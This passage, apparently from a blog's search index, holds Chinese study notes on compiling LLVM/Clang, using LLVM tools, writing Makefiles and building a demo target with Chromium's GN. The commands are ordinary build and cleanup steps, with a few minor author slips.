href="http://www.python.org/">python</a></td><td align="center">&gt;=2.7</td><td>Automated test suite2</td></tr><tr><td align="center"><a href="http://zlib.net/">zlib</a></td><td align="center">&gt;=1.2.3.4</td><td>Compression library3</td></tr><tr><td align="center"><a href="http://savannah.gnu.org/projects/make">GNU Make</a></td><td align="center">3.79, 3.79.1</td><td>Makefile/build processor4</td></tr><tr><td align="center"><a href="http://cmake.org/">CMake</a></td><td align="center">&gt;=3.4.3</td><td>Makefile/workspace generator</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install cmake</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/llvm/llvm-project.git</span><br><span class="line">$ <span class="built_in">cd</span> llvm-project</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ cmake -G <span class="string">&quot;Unix Makefiles&quot;</span> --enable-optimized --enable-targets=host-only -DLLVM_ENABLE_PROJECTS=clang ../llvm</span><br><span class="line">$ cmake --build .</span><br></pre></td></tr></table></figure><p><code>--enable-optimized</code>  打开优化，默认情况下是关闭的。这样会生成大量 debug 信息，需要较多的磁盘空间。</p><p><code>--enable-targets=host-only</code> 选择目标平台，默认情况下会生成所有平台的。 <code>host-only</code> 只选择本机即可。</p><blockquote><p>错误处理：</p><p>collect2: fatal error: ld terminated with signal 9 [Killed]</p><p>虚拟机内存不够，调大即可。</p><p>collect2: error: ld returned 1 exit status</p><p>个人情况是硬盘容量不足，拓展一下即可。</p></blockquote><h3 id="单独编译llvm"><a href="#单独编译llvm" class="headerlink" title="单独编译llvm"></a>单独编译llvm</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">下载环境包：https://releases.llvm.org/download.html</span><br><span class="line">$ mkdir llvm </span><br><span class="line">$ <span class="built_in">cd</span> llvm</span><br><span class="line">$ tar xf llvm-7.0.1.src.tar.xz</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ cmake -G <span class="string">&quot;Unix Makefiles&quot;</span> --enable-optimized --enable-targets=host-only  ../llvm-7.0.1.src</span><br><span class="line">$ cmake --build . <span class="comment">#编译</span></span><br></pre></td></tr></table></figure><p>第9行代码对应如下：</p><blockquote><p><code>cmake -G &lt;generator&gt; [options] ../llvm</code></p><p>Some common build system generators are:</p><ul><li><code>Ninja</code> 大多数llvm开发人员都使用Ninja。</li><li><code>Unix Makefiles</code> —用于生成与make兼容的并行makefile。</li><li><code>Visual Studio</code> —用于生成Visual Studio项目和解决方案。</li><li><code>Xcode</code>  用于生成Xcode项目</li></ul><p><a href="https://llvm.org/docs/GettingStarted.html">https://llvm.org/docs/GettingStarted.html</a></p><p>还有一些可选的 options：</p><ul><li><code>-DCMAKE_INSTALL_PREFIX=directory</code> 明确LLVM工具和库被安装的位置，默认在/usr/local下。</li><li><code>-DCMAKE_BUILD_TYPE=type</code> Debug选项，默认就是使用Debug，可以改为Release减少不必要的文件。</li><li><code>-DLLVM_ENABLE_ASSERTIONS=On</code> 编译时开启断言检查(assertion)，默认就是开启<br>  <strong>要注意整个llvm和build的绝对路径中不要出现中文，否则会出问题。</strong></li></ul></blockquote><h2 id="LLVM工具链的使用示例"><a href="#LLVM工具链的使用示例" class="headerlink" title="LLVM工具链的使用示例"></a>LLVM工具链的使用示例</h2><ol><li><p>Clang示例</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$ clang hello.c -o hello</span></span><br></pre></td></tr></table></figure><p> 此时得到一个可执行的 <code>hello</code>文件。c</p></li><li><p>将<code>hello.c</code>编译为LLVM字节码文件</p><p> <code>$ clang -O3 -emit-llvm hello.c -c -o hello.bc</code></p><p>  ps：<code>-emit-llvm</code>选项可与<code>-S</code>或<code>-c</code>选项一起使用，以分别为代码发出LLVM <code>.ll</code>或<code>.bc</code>文件。</p></li><li><p>使用两种方式运行程序:</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello</span><br><span class="line">$ lli hello.bc <span class="comment"># show llvm JIT</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>使用<code>llvm-dis</code>命令查看LLVM的汇编代码:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm-dis &lt; hello.bc | less</span><br></pre></td></tr></table></figure></li><li><p>使用<a href="https://llvm.zcopy.site/docs/man/llc.html">llc</a>将程序编译为本地汇编代码:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc hello.bc -o hello.s</span><br></pre></td></tr></table></figure></li></ol><p>命令小结：</p><ul><li><code>llvm-as</code>：把LLVM IR从文本格式汇编成二进制格式。注意：此处得到的<strong>不是</strong>目标平台的机器码。</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编。 不过这里的反汇编的对象是LLVM IR的二进制格式，而不是机器码。</li><li><code>opt</code>：优化LLVM IR。输出新的LLVM IR。</li><li><code>llc</code>：把LLVM IR编译成汇编码。需要用<code>as</code>进一步得到机器码。</li><li><code>lli</code>：解释执行LLVM IR。</li></ul><p>参考文章：</p><p><a href="https://llvm.zcopy.site/docs/start.html">https://llvm.zcopy.site/docs/start.html</a></p><p><a href="http://clang.llvm.org/get_started.html">http://clang.llvm.org/get_started.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
            <tag> Build </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile 学习</title>
      <link href="posts/3a49d5b4/"/>
      <url>posts/3a49d5b4/</url>
      
        <content type="html"><![CDATA[<h1 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h1><p><code>makefile</code>是一个包含一组指令的文件，<code>make build</code>自动化工具使用这些指令來生成目标。</p><p>优点：自动化编译，可以极大的提高了软件开发的效率。</p><h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target ... : prerequisites ...</span><br><span class="line">    command</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><strong>target</strong></p><p>可以是一个object file（目标文件），也可以是一个执行文件，还可以是一个标签（label）。</p><p><strong>prerequisites</strong></p><p>生成该target所依赖的文件和<code>/</code>或target。反斜杠（ <code>\</code> ）是换行符的意思。</p><p><strong>command</strong></p><p>该target要执行的命令（任意的shell命令）</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">hello:hello.c</span></span><br><span class="line">gcc -c hello.c</span><br><span class="line">gcc -o hello hello.o</span><br><span class="line">rm -f hello.o</span><br></pre></td></tr></table></figure><h2 id="工作流程浅析"><a href="#工作流程浅析" class="headerlink" title="工作流程浅析"></a>工作流程浅析</h2><ol><li>make会在当前目录下找<code>Makefile / makefile</code></li><li>找到后，会寻找第一个目标文件(target) <code>hello</code>，并作为最终的目标文件。</li><li>如果 <code>hello</code>不存在活或其依赖 <code>hello.c</code>的修改时间比 <code>hello</code>新，那么就会执行<code>command</code>来重新生成 <code>target</code></li></ol><p><strong>PS：一定要以一个 <code>Tab</code> 键作为开头</strong></p><p>make 会一层一层的寻找文件依赖关系，直至编译出第一个目标文件。如果在寻找的过程中出现错误，那么 make 就会退出并报错。</p><p>make 所着重的是寻找依赖关系，<code>command</code>的命令的正确与否是不关心的。</p><h2 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h2><h3 id="书写规则"><a href="#书写规则" class="headerlink" title="书写规则"></a>书写规则</h3><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><p>make支持三个通配符： <code>*</code> ， <code>?</code> 和 <code>~</code> </p><p><code>*</code>：匹配 0 或多个字符</p><p><code>?</code>：匹配任意一个字符</p><p><code>~</code>：Linux，<code>~</code> = <code>$HOME</code> Mac，则需要自己设置 <code>HOME</code>目录</p><h4 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VPATH = src:../headers</span><br></pre></td></tr></table></figure><p>设置搜索路径，<code>make</code>执行时，如果当前目录找不到，则到指定路径取搜寻。</p><p>另一种则是：<code>vpath</code>关键字，注意<strong>全小写</strong>。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vpath &lt;pattern&gt; &lt;directories&gt; #为符合模式&lt;pattern&gt;的文件指定搜索目录&lt;directories&gt;。</span><br><span class="line">vpath &lt;pattern&gt; #清除符合模式&lt;pattern&gt;的文件的搜索目录。</span><br><span class="line">vpath    #清除所有已被设置好了的文件搜索目录。</span><br><span class="line">eg1:</span><br><span class="line">vpath %.h ../headers #现在当前目录搜索，若没找到则在“../headers”目录下搜索所有以 .h 结尾的文件。</span><br><span class="line">eg2:</span><br><span class="line">vpath %.c foo:bar   #make按照vpath语句的先后顺序来执行搜索</span><br><span class="line">vpath %   blish   #其表示 .c 结尾的文件，先在“foo”目录，然后是“blish”，最后是“bar”目录。</span><br></pre></td></tr></table></figure><h4 id="伪目标"><a href="#伪目标" class="headerlink" title="伪目标"></a>伪目标</h4><p>“伪目标”并不是一个文件，只是一个标签，由于“伪目标”不是文件，所以make无法生成它的依赖关系和决定它是否要执行。</p><p>PS：伪目标不能和文件重名。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean  <span class="comment">#使用“.PHONY”来显式地指明一个目标是“伪目标”</span></span><br></pre></td></tr></table></figure><p>例如清空规则：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    rm *.o temp</span><br></pre></td></tr></table></figure><h3 id="书写命令"><a href="#书写命令" class="headerlink" title="书写命令"></a>书写命令</h3><h4 id="显示命令"><a href="#显示命令" class="headerlink" title="显示命令"></a>显示命令</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@echo 正在编译XXX模块......</span><br></pre></td></tr></table></figure><p><code>@</code>是必须的，如果<code>make</code>执行时，带入<code>make</code>参数 <code>-n</code> 或 <code>--just-print</code> ，那么其只是显示命令，但不会执行命令。</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">exec:</span></span><br><span class="line">    cd /home/focu5</span><br><span class="line">    pwd   <span class="comment">#打印当前目录</span></span><br><span class="line"><span class="section">exec:</span></span><br><span class="line">    cd /home/focu5;pwd <span class="comment">#打印/home/focu5下的目录</span></span><br></pre></td></tr></table></figure><h4 id="命令出错"><a href="#命令出错" class="headerlink" title="命令出错"></a>命令出错</h4><p>有些命令执行结果的正确与否我们是不关心的，那么有两种办法可以解决：</p><ol><li>在命令前加 <code>-</code></li><li>执行 <code>make</code>的时候，加上 <code>-i / --ignore-errors</code>参数（这种做法会忽略掉所有命令的错误</li></ol><p>另外：参数的是 <code>-k</code> 或是 <code>--keep-going</code> ，指如果某规则中的命令出错了，那么就终止该规则的执行，但继续执行其它规则。</p><h4 id="定义命令包"><a href="#定义命令包" class="headerlink" title="定义命令包"></a>定义命令包</h4><p>定义这种命令序列的语法以 <code>define</code> 开始，以 <code>endef</code> 结束，骨架如下:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">define</span> 包名</span><br><span class="line">...</span><br><span class="line">command</span><br><span class="line">...</span><br><span class="line"><span class="keyword">endef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 $(包名) 来调用包</span></span><br></pre></td></tr></table></figure><p>包名不能和变量名重名。</p><h3 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h3><h4 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">objects = hello.c</span><br><span class="line">tag = hello</span><br><span class="line"><span class="section">hello: <span class="variable">$(objects)</span></span></span><br><span class="line">gcc -o hello <span class="variable">$(objects)</span></span><br><span class="line"></span><br><span class="line"><span class="section">.PHONA: clean</span></span><br><span class="line"><span class="section">.PHONA: clean1</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f *.o *.out</span><br><span class="line"></span><br><span class="line"><span class="section">clean1:</span></span><br><span class="line">rm -f <span class="variable">$(tag)</span></span><br></pre></td></tr></table></figure><p>变量命名可以包含：数字、字符、下划线（可以是数字开头），但不能含有 <code>:</code> 、 <code>#</code> 、 <code>=</code> 或是空字符（空格、回车等）。<strong>变量名对大小写是敏感的</strong>。</p><p>变量在声明的时候要进行初始化，使用时最好用 <code>()或&#123;&#125;</code>将变量包裹起来，eg：<code>$(obj)   $&#123;obj&#125; </code> 另外<code>$$</code>则表示使用<code>$</code></p><p>变量会在使用它的时候精确展开。</p><h4 id="变量高级用法"><a href="#变量高级用法" class="headerlink" title="变量高级用法"></a>变量高级用法</h4><p><strong>变量值替换</strong></p><p>格式: <code>$(var:a=b)</code> 或是 <code>$&#123;var:a=b&#125;</code> 把 <code>a</code>均替换成 <code>b</code></p><p><strong>变量嵌套</strong></p><p>也就是用变量的值去做新的变量。个人觉得追加更简单一些。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = y</span><br><span class="line">y = z</span><br><span class="line">a := $(<span class="variable">$(x)</span>)  <span class="comment">#a = $(y), $(a) = z</span></span><br><span class="line">a := <span class="variable">$(x)</span> <span class="variable">$(y)</span> <span class="comment"># $(a) = y z</span></span><br><span class="line"></span><br><span class="line">y += <span class="variable">$(x)</span>  <span class="comment">#$(y) = z y</span></span><br></pre></td></tr></table></figure><h3 id="隐含规则"><a href="#隐含规则" class="headerlink" title="隐含规则"></a>隐含规则</h3><p>示例：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#①</span></span><br><span class="line">foo : foo.o bar.o</span><br><span class="line">    cc –o foo foo.o bar.o <span class="variable">$(CFLAGS)</span> <span class="variable">$(LDFLAGS)</span></span><br><span class="line"><span class="comment">#②</span></span><br><span class="line">foo.o : foo.c</span><br><span class="line">    cc –c foo.c <span class="variable">$(CFLAGS)</span></span><br><span class="line">bar.o : bar.c</span><br><span class="line">    cc –c bar.c <span class="variable">$(CFLAGS)</span></span><br></pre></td></tr></table></figure><p><code>makefile</code>会有自动推导的过程，所以我们写成①的形式会更简洁一些。</p><p>部分隐含规则：</p><ul><li><p><code>CC</code> : C语言编译程序。默认命令是 <code>cc</code>   </p></li><li><p><code>CXX</code> : C++语言编译程序。默认命令是 <code>g++</code></p></li><li><p><code>RM</code> : 删除文件命令。默认命令是 <code>rm –f</code></p></li><li><p><code>CFLAGS</code> : C语言编译器参数。</p></li><li><p><code>CXXFLAGS</code> : C++语言编译器参数。</p></li><li><p><code>LDFLAGS</code> : 链接器参数。（如： <code>ld</code> ）</p></li><li><p>使用的时候请用：$(CC) 、$(RM) 等</p><p>  <a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html">更详细参考这里</a></p></li></ul><p>示例：</p><p>把所有的 <code>.c</code> 文件都编译成 <code>.o</code> 文件.</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%.o : %.c</span><br><span class="line">    <span class="variable">$(CC)</span> -c <span class="variable">$(CFLAGS)</span> <span class="variable">$(CPPFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>其中， <code>$@</code> 表示所有的目标的挨个值， <code>$&lt;</code> 表示了所有依赖目标的挨个值。</p><h3 id="自动变量"><a href="#自动变量" class="headerlink" title="自动变量"></a>自动变量</h3><ul><li><code>$@</code> : 表示规则中的目标文件集。在模式规则中，如果有多个目标，那么， <code>$@</code> 就是匹配于目标中模式定义的集合。</li><li><code>$%</code> : 仅当目标是函数库文件中，表示规则中的目标成员名。</li><li><code>$&lt;</code> : 依赖目标中的第一个目标名字。如果依赖目标是以模式（即 <code>%</code> ）定义的，那么 <code>$&lt;</code> 将是符合模式的一系列的文件集。注意，其是一个一个取出来的。</li><li><code>$?</code> : 所有比目标新的依赖目标的集合。以空格分隔。</li><li><code>$^</code> : 所有的依赖目标的集合。以空格分隔。如果在依赖目标中有多个重复的，那么这个变量会去除重复的依赖目标，只保留一份。</li><li><code>$+</code> : 这个变量很像 <code>$^</code> ，也是所有依赖目标的集合。只是它不去除重复的依赖目标。</li></ul><h3 id="Makefile中一些GNU约定俗成的伪目标"><a href="#Makefile中一些GNU约定俗成的伪目标" class="headerlink" title="Makefile中一些GNU约定俗成的伪目标"></a>Makefile中一些GNU约定俗成的伪目标</h3><table><thead><tr><th align="left">伪目标</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">all</td><td align="left">所有目标的目标，其功能一般是编译所有的目标</td></tr><tr><td align="left">clean</td><td align="left">删除所有被make创建的文件</td></tr><tr><td align="left">install</td><td align="left">安装已编译好的程序，其实就是把目标可执行文件拷贝到指定的目录中去</td></tr><tr><td align="left">print</td><td align="left">列出改变过的源文件</td></tr><tr><td align="left">tar</td><td align="left">把源程序打包备份. 也就是一个tar文件</td></tr><tr><td align="left">dist</td><td align="left">创建一个压缩文件, 一般是把tar文件压成Z文件. 或是gz文件</td></tr><tr><td align="left">TAGS</td><td align="left">更新所有的目标, 以备完整地重编译使用</td></tr><tr><td align="left">check 或 test</td><td align="left">一般用来测试makefile的流程</td></tr></tbody></table><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://seisman.github.io/how-to-write-makefile/index.html"> 跟我一起写Makefile</a></p><p><a href="https://cloud.tencent.com/developer/article/1343894">https://cloud.tencent.com/developer/article/1343894</a></p><h1 id="GN"><a href="#GN" class="headerlink" title="GN"></a>GN</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>GN是一种元构建系统，生成Ninja构建文件（Ninja build files），相较GYP而言，具有如下优点：</p><ol><li>可读性更好，更容易编写和维护。</li><li>速度更快，谷歌官方给的数据是20倍的速度提升。</li><li>修改GN文件后，执行ninja构建时会自动更新Ninja构建文件。</li><li>更简单的模块依赖，提供了public_deps, data_deps等，在GYP中，只有一种目标依赖，导致依赖关系错综复杂，容易引入不必要的模块依赖。</li><li>提供了更好的工具查询模块依赖图谱。这在GYP构建系统中是一个噩梦，要查一个目标依赖哪些模块或者一个模块被哪些目标依赖几乎是不可能的。</li><li>更好的调试支持。在GN中，只需要一条print语句就可以解决。</li></ol><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>在 chromium 的 src 目录下创建一个新的 <code>test</code>文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">air@ubuntu:~/Desktop/chromium/src/<span class="built_in">test</span>$ ls</span><br><span class="line">BUILD.gn  demo.cc</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Hello, world.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;BUILD.gn</span><br><span class="line">group(&quot;test&quot;) &#123;</span><br><span class="line">  testonly &#x3D; true</span><br><span class="line">  deps &#x3D; [</span><br><span class="line">    &quot;:hello_world&quot;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">executable(&quot;hello_world&quot;) &#123;</span><br><span class="line">  sources &#x3D; [</span><br><span class="line">    &quot;demo.cc&quot;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在根目录的 <code>BUILD.gn</code>添加如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">group(&quot;gn_all&quot;) &#123;</span><br><span class="line">  testonly &#x3D; true</span><br><span class="line"></span><br><span class="line">  deps &#x3D; [</span><br><span class="line">    ...</span><br><span class="line">    &quot;&#x2F;&#x2F;url:url_unittests&quot;,</span><br><span class="line">    &quot;&#x2F;&#x2F;test&quot;,  ——————————————&gt; 添加目录</span><br><span class="line">    ...</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure><p>然后编译就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">air@ubuntu:~&#x2F;Desktop&#x2F;chromium&#x2F;src&#x2F;test$ gn gen out&#x2F;test</span><br><span class="line">Done. Made 17759 targets from 2922 files in 5566ms</span><br><span class="line">air@ubuntu:~&#x2F;Desktop&#x2F;chromium&#x2F;src&#x2F;test$ ninja -C out&#x2F;test hello_world</span><br><span class="line">ninja: Entering directory &#96;out&#x2F;test&#39;</span><br><span class="line">[60&#x2F;60] LINK .&#x2F;hello_world</span><br><span class="line">air@ubuntu:~&#x2F;Desktop&#x2F;chromium&#x2F;src&#x2F;test$ .&#x2F;out&#x2F;test&#x2F;hello_world </span><br><span class="line">Hello, world.</span><br></pre></td></tr></table></figure><h2 id="构建流程"><a href="#构建流程" class="headerlink" title="构建流程"></a>构建流程</h2><ol><li>在当前目录中查找<code>.gn</code>文件并向上遍历目录树，直到找到<code>.gn</code>。将此目录设置为根目录，并解释此文件以查找生成配置文件的名称。</li><li>执行构建配置文件（这是默认工具链）。</li><li>将<code>BUILD.gn</code>文件加载到根目录中。</li><li>递归加载其他目录中的<code>BUILD.gn</code>以解析所有当前依赖项。如果在指定位置找不到生成文件，GN将在<code>tools/GN/secondary</code>内的相应位置查找</li><li>解析目标的依赖项后，将<code>.ninja</code>文件写出到磁盘。</li><li>当所有目标都解决后，写出<code>root build.ninja</code>文件。</li></ol><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>执行的第一个文件是构建配置文件。此文件的名称在标记存储库根目录的<code>.gn</code>文件中指定。在Chrome中是<code>src/build/config/BUILDCONFIG.gn</code>只有一个构建配置文件。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>目标是构建图中的一个节点。它通常代表将要生成的某种类型的可执行文件或库文件。目标取决于其他目标。内置的目标类型（请参阅<code>gn help &lt;targettype&gt;</code>以获取更多帮助）是：</p><ul><li><code>action</code>：运行一个脚本来生成一个文件。</li><li><code>action_foreach</code>：为每个源文件运行一次脚本。</li><li><code>bundle_data</code>：声明数据加入到Mac / iOS包。</li><li><code>create_bundle</code>：创建一个Mac / iOS包。</li><li><code>executable</code>：生成一个可执行文件。</li><li><code>group</code>：引用一个或多个其他目标的虚拟依赖关系节点。</li><li><code>shared_library</code>：.dll或.so。</li><li><code>loadable_module</code>：.dll或.so只能在运行时加载。</li><li><code>source_set</code>：一个轻量级的虚拟静态库（通常比真正的静态库更可取，因为它的构建速度会更快）。</li><li><code>static_library</code>：.lib或.a文件（通常你会想要一个<code>source_set</code>）。</li></ul><p>更多资料可以看官方文档。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://chromium.googlesource.com/chromium/src/tools/gn/+/48062805e19b4697c5fbd926dc649c78b6aaa138/docs/language.md">https://chromium.googlesource.com/chromium/src/tools/gn/+/48062805e19b4697c5fbd926dc649c78b6aaa138/docs/language.md</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> makefile </category>
          
      </categories>
      
      
        <tags>
            
            <tag> makefile </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
